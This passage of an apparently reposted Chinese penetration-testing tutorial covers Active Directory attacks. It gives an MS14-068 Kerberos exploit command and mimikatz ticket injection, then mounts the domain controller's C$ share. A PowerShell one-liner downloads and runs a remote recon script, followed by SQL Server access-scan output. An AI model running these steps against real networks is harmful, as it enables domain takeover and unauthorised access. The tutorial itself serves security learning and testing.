python ms14-<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">068</span>.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">产生缓存的票据，在当前卡利下生成之后再放到域用户机器中</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.16666666666666666" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/9_UgjiajMibndPicgSkKbib4icPvbOpg.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVn4icNIZuiaibd5wWVXy8eR6a3Okbia8GKUgjiajMibndPicgSkKbib4icPvbOpg/640?wx_fmt=jpeg'" data-type="jpeg" data-w="528" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">利用mimikatz将工具得到的</span><span style="font-size:14px;line-height:34px;;">TGT_domainuser@SERVER.COM.ccache</span><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">写入内存，创建缓存证书：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">mimikatz</span>.exe "<span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">kerberos</span>::ptc <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">c</span>:TGT_darthsidious@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">pentest</span>.<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">com</span>.<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ccache</span>" exit</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="1.1842696629213483" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/10_0BTfoKG0ovp8ncAtxl6QUKowMM2D5Q.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVuwc5Z4ON6RB9JmquMJTbVS0p0BTfoKG0ovp8ncAtxl6QUKowMM2D5Q/640?wx_fmt=jpeg'" data-type="jpeg" data-w="890" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">klist查看</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">net</span> use k: \pentest.comc$</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">dir k：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.45861297539149887" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/11_b7PL7o9zl07xYpxrnByuB4K3QyYFwA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVbeFupBvftrF523gC1dLxHZOicb7PL7o9zl07xYpxrnByuB4K3QyYFwA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="894" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">相关资料：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Kerberos的工具包PyKEK</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://adsecurity.org/?p=676</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">深入解读MS14-068漏洞</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://www.freebuf.com/vuls/56081.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Kerberos的安全漏洞</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://adsecurity.org/?p=541</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">防：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">安装检查KB3011780的安装</span></p><h3 name="h3-4" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">SPN扫描</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内置帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs bash" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">powershell -<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">exec</span> bypass -Command <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers'); Discover-PSMSSQLServers"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.83810888252149" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/12_kgRMdiaEIt33GE34xADDkMxDxLO4Bw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVa0folSdpYHQGU83jxlg0OnvcickgRMdiaEIt33GE34xADDkMxDxLO4Bw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1396" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">扫描SQL Server脚本</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/nullbind/Powershellery/tree/master/Stable-ish/MSSQL</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">Import-Module</span> .Get-SQLServerAccess.psm1</span></code></pre><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">PS C:Get-SqlServer-Escalate-CheckAccess 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ---------------------------------------------------------------------- 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Start Time: <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">04</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">01</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">2014</span> <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">10</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span> [<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Domain: mydomain.com 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] DC: dc1.mydomain.com [*] Getting list of SQL Server instances <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">from</span> DC <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">as</span> mydomainmyuser... 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">5</span> SQL Server instances found <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">in</span> LDAP. 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Attempting to login <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">into</span> <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">5</span> SQL Server instances <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">as</span> mydomainmyuser... 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ---------------------------------------------------------------------- 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">-</span>] Failed &nbsp; - server1.mydomain.com <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">is</span> not responding to pings 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">-</span>] Failed &nbsp; - server2.mydomain.com (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.102</span>) <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">is</span> up, but authentication/query failed 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">+</span>] SUCCESS! - server3.mydomain.com,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1433</span> (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.103</span>) - Sysadmin: No - SvcIsDA: No &nbsp;
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">+</span>] SUCCESS! - server3.mydomain.comSQLEXPRESS (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.103</span>) - Sysadmin: No - SvcIsDA: No 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">+</span>] SUCCESS! - server4.mydomain.comAppData (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.104</span>) - Sysadmin: Yes - SvcIsDA: Yes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ---------------------------------------------------------------------- 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">3</span> of <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">5</span> SQL Server instances could be accessed. &nbsp; &nbsp; &nbsp; &nbsp; 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] End Time: <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">04</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">01</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">2014</span> <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">10</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">02</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span> &nbsp; &nbsp; &nbsp; [<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Total Time: <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">02</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span> [<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ----------------------------------------------------------------------</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">通过LDAP从ADS获取SQL Server的列表，然后试图用当前域用户登陆每一个SQL Server。这次将输出到CSV文件中。</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">PS C:Get-SQLServerAccess -ShowSum | export-csv c:tempsql-server-excessive-privs.csv
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ----------------------------------------------------------------------
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Start Time: <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">04</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">01</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">2014</span> <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">10</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span>[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Domain: mydomain.com
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] DC: dc1.mydomain.com
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Getting list of SQL Server instances <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">from</span> DC <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">as</span> mydomainmyuser...
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">5</span> SQL Server instances found <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">in</span> LDAP.
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Attempting to login <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">into</span> <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">5</span> SQL Server instances <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">as</span> mydomainmyuser...
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ----------------------------------------------------------------------
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">-</span>] Failed &nbsp; - server1.mydomain.com <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">is</span> not responding to pings
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">-</span>] Failed &nbsp; - server2.mydomain.com (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.102</span>) <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">is</span> up, but authentication/query failed
